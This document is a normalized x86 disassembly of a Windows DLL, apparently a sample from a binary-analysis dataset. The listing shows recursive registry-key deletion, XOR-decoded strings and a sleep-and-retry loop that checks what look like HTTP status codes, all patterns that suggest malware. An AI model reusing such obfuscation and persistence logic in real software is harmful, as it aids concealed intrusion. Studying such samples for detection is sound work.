cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_10028f58
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10068aef
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10028f80
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_10028fbd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10058c10
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10028ffe
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_10050c05
call sub_1006e606
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_10029028
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100424ab
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000bb8f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_100290e0
push ebp
mov ebp esp
sub esp 0x630
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push 0x410
lea eax [ ebp - 0x628 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
push edi
push esi
call [ RegDeleteKeyW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x630 ]
push ecx
push 0x20019
push 0x0
push edi
push esi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x62c ]
push edx
lea eax [ ebp - 0x218 ]
push eax
push 0x0
push ecx
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
sub eax 0x2
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push ecx
call [ RegCloseKey@IAT ]
push edi
push esi
call [ RegDeleteKeyW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffd
pop edi
xor ecx ebp
add eax 0x3
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x30
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x10 ]
xor eax eax
push edi
push edx
mov ecx 0x208
lea ebx [ ebp - 0x628 ]
mov [ ebp - 0x6 ] ax
call sub_1002cb70
mov eax ebx
push eax
push esi
call sub_100290e0
add esp 0x14
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
push 0x0
push eax
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
sub_10029266
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_1004846a
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1006299d
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1004846a
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_1004846a
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004846a
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_10012afe
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1006299d
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1005bb4f
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1006299d
mov [ eax ] 0xd
call sub_10017e58
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_10017e58
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1006299d
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1001df5b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10012afe
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_10029420
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10069747
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10029450
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push ebx
xor ebx ebx
mov [ ebp - 0x220 ] eax
push esi
mov [ ebp - 0x218 ] ebx
xor eax eax
mov edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x77
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x6
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x18 ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0xc ] ax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x1d4 ]
mov eax 0x12c
mov [ ebp - 0x214 ] ebx
call sub_10053240
lea eax [ ebp - 0x214 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x10a
call sub_10053240
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x52
mov [ ebp - 0x1e0 ] ebx
call sub_10053240
lea edx [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x110 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xdf
call sub_10053240
mov ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x214 ]
push eax
call esi
mov ecx [ ebp - 0x1e0 ]
push ecx
call esi
mov edx [ ebp - 0x200 ]
push edx
call esi
mov eax [ ebp - 0x1e8 ]
push eax
call esi
mov ecx [ ebp - 0x210 ]
push ecx
call esi
mov edx [ ebp - 0x1f0 ]
push edx
call esi
mov eax [ ebp - 0x208 ]
push eax
call esi
mov ecx [ ebp - 0x1f8 ]
push ecx
call esi
mov edx [ ebp - 0x20c ]
push edx
call esi
mov eax [ ebp - 0x1dc ]
push eax
call esi
mov ecx [ ebp - 0x1e4 ]
push ecx
call esi
mov edx [ ebp - 0x1ec ]
push edx
call esi
mov eax [ ebp - 0x1f4 ]
push eax
call esi
mov ecx [ ebp - 0x1fc ]
push ecx
call esi
mov edx [ ebp - 0x204 ]
push edx
call esi
mov ecx [ ebp - 0x8 ]
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x160 ]
mov eax 0x18
mov [ ebp - 0x200 ] ebx
call sub_10053240
lea ecx [ ebp - 0x200 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x12b
call sub_10053240
lea edx [ ebp - 0xd4 ]
mov eax 0x55
mov [ ebp - 0x1e8 ] ebx
call sub_10053240
lea eax [ ebp - 0x1e8 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x111
call sub_10053240
lea edx [ ebp - 0xe8 ]
mov eax 0x31
mov [ ebp - 0x210 ] ebx
call sub_10053240
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x2c
call sub_10053240
lea edx [ ebp - 0x30 ]
mov eax 0x1a
mov [ ebp - 0x1f0 ] ebx
call sub_10053240
lea ecx [ ebp - 0x1f0 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xf
call sub_10053240
mov ebx 0x4
jmp r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xe2
mov [ ebp - 0x208 ] ebx
call sub_10053240
lea eax [ ebp - 0x208 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xa6
call sub_10053240
lea edx [ ebp - 0x138 ]
mov eax 0xee
mov [ ebp - 0x1f8 ] ebx
call sub_10053240
lea edx [ ebp - 0x1f8 ]
push edx
lea eax [ ebp - 0x138 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x74
call sub_10053240
mov ebx 0x5
jmp r-xdata
lea edx [ ebp - 0x188 ]
mov eax 0x70
mov [ ebp - 0x1d8 ] ebx
call sub_10053240
lea ecx [ ebp - 0x1d8 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x5b
call sub_10053240
mov ebx 0x6
jmp r-xdata
lea edx [ ebp - 0x174 ]
mov eax 0x96
mov [ ebp - 0x20c ] ebx
call sub_10053240
lea eax [ ebp - 0x20c ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x1d8 ] r--data
lea edx [ ebp - 0x124 ]
mov eax 0xac
mov [ ebp - 0x1dc ] ebx
call sub_10053240
lea edx [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x124 ]
push eax
call sub_100724e0
lea edx [ ebp - 0xc4 ]
mov eax 0x8a
mov [ ebp - 0x1e4 ] ebx
call sub_10053240
lea ecx [ ebp - 0x1e4 ]
push ecx
push edx
call sub_100724e0
lea edx [ ebp - 0x1b8 ]
mov eax 0x5f
mov [ ebp - 0x1ec ] ebx
call sub_10053240
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x18
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xa4
call sub_10053240
lea edx [ ebp - 0x14c ]
mov eax 0x8b
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] ebx
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x1fc ] ebx
call sub_10053240
lea edx [ ebp - 0x1f4 ]
push edx
lea eax [ ebp - 0x14c ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x121
call sub_10053240
lea edx [ ebp - 0x1a0 ]
mov eax 0xb0
call sub_10053240
lea ecx [ ebp - 0x204 ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
mov eax 0xbe
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x122
call sub_10053240
lea eax [ ebp - 0x21c ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x7a
call sub_10053240
lea edx [ ebp - 0x9c ]
call sub_10053240
lea edx [ ebp - 0xfc ]
mov eax 0x11
call sub_10053240
lea edx [ ebp - 0x1fc ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x6b
call sub_10053240
xor eax eax
mov ecx [ ebp - 0x21c ]
mov edx [ ebp - 0x204 ]
push ecx
mov ecx [ ebp - 0x1fc ]
push edx
mov edx [ ebp - 0x1f4 ]
push ecx
mov ecx [ ebp - 0x1ec ]
push edx
mov edx [ ebp - 0x1e4 ]
push ecx
mov ecx [ ebp - 0x1dc ]
push edx
mov edx [ ebp - 0x1d8 ]
push ecx
mov ecx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x1f8 ]
push ecx
mov ecx [ ebp - 0x208 ]
push edx
mov edx [ ebp - 0x1f0 ]
push ecx
mov ecx [ ebp - 0x210 ]
push edx
mov edx [ ebp - 0x1e8 ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x218 ]
push ecx
mov ecx [ ebp - 0x1e0 ]
push edx
mov edx [ ebp - 0x200 ]
mov esi eax
call sub_10051fc0
jmp r-xdata
push 0x58
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov eax 0x9
lea edx [ ebp - 0x7c ]
mov eax 0x75
call sub_10053240
mov ecx [ ebp - 0x220 ]
mov [ ecx ] eax
push edi
mov ecx eax
call sub_10001f10
test eax eax
je r-xdata
sub_10029a2f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1006299d
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_100079d1
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1006e5c0
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10029b50
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10029ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b23
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x3c4 ]
mov eax [ esi + 0x3c0 ]
mov [ ebp - 0x48 ] esi
mov ebx edx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x159
call sub_10045930
mov edi [ esi + 0x3a0 ]
mov eax [ esi + 0x3a4 ]
cmp edi eax
je r-xdata
cmp [ eax ] ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
cmp ebx [ ecx ]
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x34 ]
lea ecx [ esi + 0x20 ]
cmp edx 0x10
jb r-xdata
add edi 0x4
cmp edi eax
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
jmp r-xdata
add [ esi + 0x3c4 ] 0xfffffff8
jmp r-xdata
lea ecx [ eax - 0x8 ]
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x44 ] dx
mov edx [ ebp - 0x48 ]
push edx
push eax
push ecx
lea eax [ ebp - 0x44 ]
xor esi esi
push eax
mov [ ebp - 0x30 ] 0x7
mov [ ebp - 0x34 ] esi
call sub_1005c040
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
lea eax [ ebp - 0x28 ]
lea edx [ esi + 0x4 ]
lea ebx [ eax + 0x2 ]
nop
mov ecx [ ecx ]
mov eax [ ecx + 0x10 ]
add eax esi
cmp edx 0x10
jb r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push edx
call sub_10056a70
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x3e8
mov [ ebp - 0x4c ] esi
test esi esi
je r-xdata
mov edx [ ebp - 0x44 ]
push edx
call sub_100187af
add esp 0x4
mov esi [ ebp - 0x48 ]
mov ecx [ esi + 0x3a4 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_1007ec90
add esp 0xc
add [ esi + 0x3a4 ] 0xfffffffc
jmp r-xdata
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005f210
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x30 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] ax
call sub_100187af
add esp 0x4
mov edx [ esi + 0x4 ]
push edx
call sub_100187af
add esp 0x4
sub_10029d60
push ebp
mov ebp esp
push 0xffffffff
push sub_100876a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x198 ] eax
cmp [ eax + 0xec ] ebx
jne r-xdata
push ebx
push r--data
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x1b4 ] ebx
mov [ ebp - 0x19c ] ebx
mov [ ebp - 0x1a0 ] ebx
mov [ ebp - 0xa8 ] 0xf
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xbc ] bl
call sub_10037e00
cmp [ ebp + 0x10 ] 0x2
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov edi [ ebp - 0x1b4 ]
lea esp [ esp ]
push ebx
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
call sub_10037e00
push 0x8
lea eax [ ebp - 0x180 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10041240
mov edi [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x74 ] ebx
lea esi [ ebp - 0x190 ]
sete al
xor ecx ecx
cmp al bl
sete cl
add ecx 0x6
push ecx
call sub_10057a60
mov [ ebp - 0x4 ] 0x3
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x18c ]
mov esi [ ebp - 0x190 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0xa8 ] 0x10
jb r-xdata
cmp edi ebx
je r-xdata
push esi
lea eax [ ebp - 0x190 ]
call sub_100629b0
mov esi [ ebp - 0x198 ]
push eax
push esi
lea edi [ ebp - 0xd8 ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1002d84e
mov eax 0x43
jmp r-xdata
mov ecx [ ebp - 0xbc ]
push ecx
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x198 ]
mov ecx [ edx + 0xec ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ebp - 0x1a8 ]
push edx
lea edx [ ebp - 0x1a4 ]
push edx
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x19c ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
mov ecx [ ebp - 0x1a8 ]
mov esi eax
mov eax [ ebp - 0x1a4 ]
inc edi
cmp eax 0x12e
je r-xdata
push 0xdac
call [ Sleep@IAT ]
push edi
push esi
lea eax [ ebp - 0x190 ]
call sub_10064570
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x1a0 ] eax
lea eax [ ebp - 0x12c ]
push r--data
push eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
mov [ ebp - 0x191 ] 0x1
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0x12c ]
call sub_10059c40
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
cmp esi ebx
jne r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x1a8 ] ebx
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x190 ]
call sub_10064570
push 0x3
push r--data
lea ecx [ ebp - 0x110 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
call sub_10037e00
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x18c ]
mov edi [ ebp - 0x190 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
cmp edi 0x5
jg r-xdata
cmp eax 0xc8
je r-xdata
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x190 ]
call sub_100629b0
push eax
push esi
lea edi [ ebp - 0x110 ]
